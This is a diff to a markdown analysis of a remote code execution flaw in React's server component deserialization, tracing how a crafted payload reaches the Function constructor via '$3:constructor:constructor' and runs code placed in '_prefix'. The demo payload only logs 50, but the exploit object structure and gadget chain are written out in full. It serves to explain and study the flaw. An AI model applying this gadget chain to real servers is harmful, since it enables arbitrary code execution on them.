@@ -305,78 +305,116 @@ When React deserializes this payload, here's what happens:
     
 ### Code Execution Flow
 
-**1. Initial Reference Resolution**
-
-When `getOutlinedModel` is called with reference `'$1'`:
-
-```
-reference = '$1'
-path = ['1']
-id = parseInt('1', 16) = 1
-chunk = getChunk(response, 1)
-```
-
-**2. Chunk Processing**
-
-The chunk at id=1 has `status: 'resolved_model'`, triggering:
+**1. Initial Deserialization Entry Point**
 
 ```javascript
-case RESOLVED_MODEL:
-    initializeModelChunk(chunk);
+// React starts processing at key '0'
+reference = "$1"
+path = ['1']
+id = parseInt('1', 16) = 1
 ```
+
+**Action**: Call `getChunk(response, 1)` to retrieve the chunk at key `'1'`
+
+**2. Processing Main Exploit Object (Key '1')**
+
+```javascript
+// Chunk retrieved from key '1':
+{
+    'status': 'resolved_model',
+    'reason': 0,
+    '_response': '$4',
+    'value': '{"then":"$3:map","0":{"then":"$B3"},"length":1}',
+    'then': '$2:then'
+}
+```
+
+**Status Check**: `chunk.status === RESOLVED_MODEL`  
+**Action**: Call `initializeModelChunk(chunk)`
 
 **3. Model Initialization**
 
-`initializeModelChunk` parses the `value` string:
-
-```json
-{"then":"$3:map","0":{"then":"$B3"},"length":1}
-```
-
-This creates an object with:
-
-- A `then` property referencing `'$3:map'` (triggering promise-like behavior)
-- Property `'0'` with nested `then: '$B3'`
-- A `length` property (making it array-like)
-
-**4. Property Traversal Exploitation**
-
-The critical vulnerability occurs in this loop:
-
 ```javascript
-for (let i = 1; i < path.length; i++) {
-    value = value[path[i]];
+// Inside initializeModelChunk()
+const resolvedModel = chunk.value;
+const rawModel = JSON.parse(resolvedModel);
+// Parses to:
+{
+    "then": "$3:map",
+    "0": {"then": "$B3"},
+    "length": 1
 }
 ```
 
-When processing reference `'$3:map'`, the path becomes `['3', 'map']`, causing:
+**Result**: Object with blob reference `$B3` detected in nested property
+
+**4. Blob Reference Resolution Triggered**
 
 ```javascript
-value = value['map']  // Accesses Array.prototype.map
+// React encounters blob reference "$B3"
+reference = "$B3"
+// Strip $B prefix
+blobId = "3"
+id = parseInt('3', 16) = 3
 ```
 
-**5. Constructor Chain Access**
+**Action**: Call `getChunk(response, 3)` with manipulated response object
 
-The payload in key '4' exploits the `_formData` structure:
+**5. Critical Gadget Chain Setup**
 
 ```javascript
-'_formData': {
-    'get': '$3:constructor:constructor'
+// Before getChunk() is called, response is resolved to key '4':
+response = {
+    '_prefix': 'console.log(7*7+1)//',
+    '_formData': {
+        'get': '$3:constructor:constructor'  // ← Critical reference
+    },
+    '_chunks': '$2:_response:_chunks'
 }
 ```
 
-This reference chain resolves as:
-
-1. `$3` → Empty array `[]`
-2. `:constructor` → `Array.constructor` (the Array function)
-3. `:constructor` → `Function.constructor` (the Function constructor)
-
-**6. Code Execution**
-
-The `_prefix` field contains the malicious code:
+**6. Resolving _formData.get Reference**
 
 ```javascript
-'_prefix': 'console.log(7*7+1)//'
+// Processing reference "$3:constructor:constructor"
+reference = "$3:constructor:constructor"
+path = ['3', 'constructor', 'constructor']
+id = parseInt('3', 16) = 3
+
+// Call getChunk(response, 3) → returns empty array []
+chunk = []
+
+// Inside getOutlinedModel() traversal loop:
+let value = chunk.value;  // value = []
+
+// i = 1:
+value = value['constructor'];  // value = Array (function)
+
+// i = 2:
+value = value['constructor'];  // value = Function (constructor)
+
+// Return value
+return value;  // Returns: Function constructor
+```
+
+**Result**: `response._formData.get` now points to `Function` constructor
+
+**7. Code Execution in getChunk()**
+
+```javascript
+// Back in getChunk() processing blob "$B3"
+const prefix = response._prefix;  // "console.log(7*7+1)//"
+const key = prefix + id;          // "console.log(7*7+1)//3"
+
+// This line triggers RCE:
+const backingEntry = response._formData.get(key);
+
+// Since response._formData.get = Function constructor, this becomes:
+Function("console.log(7*7+1)//3")
+
+// Executes:
+console.log(7*7+1)  // Outputs: 50
+// The "//3" is commented out
 ```
 
 ### Why This Works
